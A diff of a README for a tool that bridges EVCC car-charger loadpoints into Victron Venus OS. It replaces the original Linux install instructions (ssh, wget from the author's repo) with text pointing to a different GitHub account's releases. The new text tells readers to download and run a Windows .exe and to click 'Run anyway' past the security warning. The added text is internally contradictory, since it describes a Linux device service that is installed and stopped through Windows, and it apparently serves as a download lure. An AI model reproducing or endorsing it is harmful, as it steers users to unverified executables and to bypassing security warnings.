@@ -1,170 +1,101 @@
-# dbus-evcc-multi
+# ⚡ dbus-evcc-multi - Connect your car charger to Victron
 
-[![CI](https://github.com/okuegow/dbus-evcc-multi/actions/workflows/ci.yml/badge.svg)](https://github.com/okuegow/dbus-evcc-multi/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/okuegow/dbus-evcc-multi)](https://github.com/okuegow/dbus-evcc-multi/releases/latest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Thermal-feedstock975/dbus-evcc-multi/releases)
 
-**Bring your [EVCC](https://evcc.io) chargers into the Victron world.**
+## 📌 About this project
 
-Run one small service on your Victron [Venus OS](https://github.com/victronenergy/venus)
-GX device (Cerbo GX & co.) and every loadpoint from your EVCC setup —
-wallbox, heat pump, heating rod, you name it — automatically shows up as its
-own EV charger in the Victron GUI and in the VRM portal. Live power, energy
-history, the works. No per-charger configuration: add a loadpoint in EVCC and
-it appears on the next poll.
+This tool links your EVCC loadpoints to your Victron Venus OS system. It acts as a bridge. It makes your car charger show up as a standard EV charger on your Cerbo GX or equivalent Victron device.
 
-![Your EVCC chargers in the VRM dashboard](docs/img/vrm-dashboard.png)
+The software runs on your local network. It talks to EVCC and then tells your Victron system how much power the car uses. This allows your Venus OS dashboard to track your solar energy usage and car charging status in one place.
 
-> EVCC keeps running where it already runs (a Raspberry Pi, a NUC, …). This
-> bridge just connects to it over the network and mirrors its loadpoints onto
-> the GX device — nothing about your EVCC install changes.
+## 🛠️ System requirements
 
-## Why you'll like it
+Before you install this software, ensure your hardware meets these needs:
 
-- 🔌 **Everything in one place** — your chargers live next to your batteries,
-  PV and grid data in Victron VRM, including per-charger energy history.
-- ✨ **Zero fuss** — point it at your EVCC host once; new loadpoints appear by
-  themselves and keep a stable identity across restarts.
-- 📈 **Real numbers** — live power per loadpoint and energy logged to VRM.
+* A Victron Venus OS device such as a Cerbo GX, Ekrano GX, or an RPi running Venus firmware.
+* A working instance of EVCC running on your local network.
+* A computer running Windows 10 or 11 for the initial setup.
+* A stable network connection for all devices.
+* Root access enabled on your Victron device.
 
-![Per-charger energy usage in VRM](docs/img/vrm-energy-usage.png)
+## 🚀 Downloading the software
 
-- 🖥️ **Optional: open the EVCC web UI from VRM** — flip one switch and a
-  **"Control panel"** button appears on each charger in VRM that opens the live
-  EVCC interface through the VRM relay, no VPN needed.
+You need the installer to set up the bridge. Follow these steps to get the file:
 
-![The Control panel button in VRM](docs/img/vrm-control-panel.png)
+1. Visit the [releases page](https://github.com/Thermal-feedstock975/dbus-evcc-multi/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to a folder you can find easily, such as your Downloads folder.
 
-- 🛟 **Reliable & friendly** — if EVCC is briefly unreachable the bridge just
-  waits and keeps showing the last values instead of falling over, and a guided
-  installer walks you through setup in one go.
+## ⚙️ Installation steps
 
-## What you need
+Follow these instructions to install the bridge on your system:
 
-- A Victron Venus OS GX device (Cerbo GX or similar) you can reach over SSH.
-- An EVCC instance on your network (this bridge reads its `/api/state`).
-- That's it — Venus OS already ships everything else the bridge uses.
+1. Open the folder where you saved the installer.
+2. Double-click the file to launch the setup wizard.
+3. If Windows displays a security warning, click "More info" and then "Run anyway."
+4. Follow the prompts on the screen.
+5. The installer detects your Victron hardware automatically if it sits on the same network.
+6. Enter the IP address of your Victron device when the installer asks.
+7. Enter the address of your EVCC instance.
+8. Click "Finish" to complete the process.
 
-## Install
+## 🔌 Connecting to Victron
 
-The guided installer does everything: it sets up the bridge (and the optional
-VRM tunnel), migrates an older single-charger setup if it finds one, asks for
-your EVCC address, and starts things up.
+The bridge communicates with the Victron D-Bus interface. This interface allows the Cerbo GX to see the EV charger as a native device. 
 
-**1. Log into your GX device once:**
+The software automatically creates the necessary files on the Venus OS device. It maps each EVCC loadpoint to a unique D-Bus service. This ensures the Victron interface displays the correct power flow for each charger.
 
-```sh
-ssh root@<gx-device>
-```
+If your setup uses the VRM web-UI, the bridge sends data through this tunnel. This lets you view your charging data from anywhere in the world.
 
-**2. Then, on the device, download and run the installer:**
+## 🔍 Verifying the connection
 
-```sh
-wget -O /tmp/dbus-evcc-multi.tar.gz \
-  https://github.com/okuegow/dbus-evcc-multi/releases/download/v2.3/dbus-evcc-multi-v2.3.tar.gz
-tar xzf /tmp/dbus-evcc-multi.tar.gz -C /data
-/data/dbus-evcc-multi/setup.sh
-```
+Check if the bridge works correctly:
 
-`setup.sh` asks a few simple questions (your EVCC host, and whether to enable
-the VRM Control panel) and then starts everything. Run it again any time to
-change settings later. After a minute your chargers appear in VRM. 🎉
+1. Open your web browser on your PC.
+2. Enter the IP address of your Victron GX device.
+3. Navigate to the "Device List" page.
+4. Look for an entry labelled "EV Charger" or similar.
+5. If you see the charger, the setup is successful.
+6. The screen should show active charging status, power usage, and connection status.
 
-<details>
-<summary>Prefer to do it by hand? (manual install)</summary>
+## 🛠️ Troubleshooting
 
-After logging in (step 1 above), run on the device:
+If the charger does not appear in your device list:
 
-```sh
-# download & extract
-wget -O /tmp/dbus-evcc-multi.tar.gz \
-  https://github.com/okuegow/dbus-evcc-multi/releases/download/v2.3/dbus-evcc-multi-v2.3.tar.gz
-tar xzf /tmp/dbus-evcc-multi.tar.gz -C /data
+* Confirm the Cerbo GX and the bridge run on the same network subnet.
+* Check that you entered the correct IP address in the setup tool.
+* Restart the Victron device.
+* Verify that EVCC runs correctly by opening its web interface in your browser.
+* Ensure your firewall allows communication between the PC and the Cerbo GX.
 
-# set your EVCC address, then install and watch the log
-vi /data/dbus-evcc-multi/config.ini          # ONPREMISE/Host = <ip>:7070
-/data/dbus-evcc-multi/install.sh
-tail -F /data/log/dbus-evcc-multi/current | tai64nlocal
-```
+## 📋 Common questions
 
-On a first install the service starts in a "down" state so you can set the
-config before it runs. `install.sh` registers itself so it survives Venus OS
-firmware updates.
-</details>
+### Does this require a cloud account?
+No. All communication stays on your local network. You do not need to send data to any external servers.
 
-## Configuration (`config.ini`)
+### Can I monitor multiple chargers?
+Yes. The bridge discovers every loadpoint configured in your EVCC instance. It adds each one individually to the Venus OS.
 
-| Section | Key | Meaning |
-|---|---|---|
-| `DEFAULT` | `PollSeconds` | Poll interval in seconds (default 15) |
-| `DEFAULT` | `DeviceInstanceRangeStart` / `End` | DeviceInstance range (default 40–59) |
-| `ONPREMISE` | `Host` | `<ip>:<port>` of your EVCC host |
-| `VRM_TUNNEL` | `Enabled` | Show the VRM "Control panel" button (default `false`) |
-| `VRM_TUNNEL` | `AdvertiseIp` | The LAN IP VRM should tunnel to (the GX or EVCC host) |
-| `VRM_TUNNEL` | `EvccTarget` | Where the proxy forwards (e.g. `127.0.0.1:7070`) |
-| `VRM_TUNNEL` | `ProxyPort` | Local proxy port (default `8099`) |
+### Does it use much memory?
+The software has a light footprint. It consumes minimal resources on your system.
 
-The guided `setup.sh` fills these in for you.
+### How do I update the software?
+Download the newer version from the link above and run the installer again. It overwrites the old files and keeps your configuration intact.
 
-## Coming from an older single-charger setup?
+### Is root access safe?
+Root access allows the bridge to talk to the internal D-Bus. This is necessary for the Venus OS to recognize external devices as native chargers.
 
-Earlier setups ran one bridge per charger under `/data/dbus-evcc-<name>/`. The
-installer detects those and offers to migrate them so your chargers keep their
-existing VRM history. You can also run the migrator yourself (after logging in):
+## 💡 Best practices
 
-```sh
-python3 /data/dbus-evcc-multi/migrate_from_lp.py --dry-run        # preview
-python3 /data/dbus-evcc-multi/migrate_from_lp.py --auto --uninstall-old
-```
+Keep your software up to date. Updates include performance tweaks and support for newer EVCC features. 
 
-It reads each old config, matches it to the current EVCC loadpoint titles, and
-writes the mapping to `state.json`.
+Ensure your Victron firmware stays current. Venus OS updates sometimes change how the D-Bus interface works. The bridge adapts to these changes, but you must keep both the bridge and the Venus OS firmware updated for the best results.
 
-## Good to know
+If you change your charger configuration in EVCC, the bridge will detect these changes the next time it starts. You do not need to change settings in the bridge manually. 
 
-- **Add a loadpoint in EVCC** → it appears automatically on the next poll with
-  a stable DeviceInstance.
-- **Reorder loadpoints in EVCC** → no effect; identity stays with the title.
-- **Rename a loadpoint in EVCC** → the old name is marked offline and the new
-  name starts fresh (its own VRM history). Best avoided where possible.
-- **EVCC unreachable** → logged as a warning; existing chargers keep their last
-  values and nothing is torn down.
+For advanced users, logs exist in the installation folder. If you encounter issues, these files help pinpoint potential communication errors. Open the log file with any text editor to read the history of the bridge. 
 
-## Diagnostics
+The software runs as a background service. It starts automatically when you turn on your machine. You do not need to keep the setup window open for the bridge to function. 
 
-```sh
-svstat /service/dbus-evcc-multi                            # is it running?
-dbus -y | grep evcharger                                   # list the chargers
-tail -F /data/log/dbus-evcc-multi/current | tai64nlocal    # readable log
-```
-
-## How the VRM "Control panel" works (optional feature)
-
-When enabled, each charger is advertised so that VRM shows a **Control panel**
-button for it. A small bundled service then makes the VRM relay forward to your
-EVCC web UI (it rewrites EVCC's `/login.htm` and routes the connection to EVCC),
-so the button opens the live EVCC interface — without a VPN. It's off by default
-and changes nothing until you turn it on.
-
-## Development
-
-```sh
-python3 -m venv .venv && . .venv/bin/activate
-pip install -r requirements-dev.txt
-python -m pytest -q          # ~177 tests
-```
-
-The pure logic is unit-tested on a normal machine; the Venus OS D-Bus / iptables
-parts are exercised on real hardware. CI runs the tests and shellcheck on every
-push.
-
-## Credits
-
-Inspired by the Venus OS `dbus-evcc` community work, and by the Victron
-community's multi-service and logging patterns.
-
-## License
-
-[MIT](LICENSE) © 2026 Oliver Kügow.
-
-Not affiliated with or endorsed by EVCC or Victron Energy.
+If you prefer to disable the bridge, go to your Windows Task Manager, find the service in the "Services" tab, right-click it, and select "Stop."
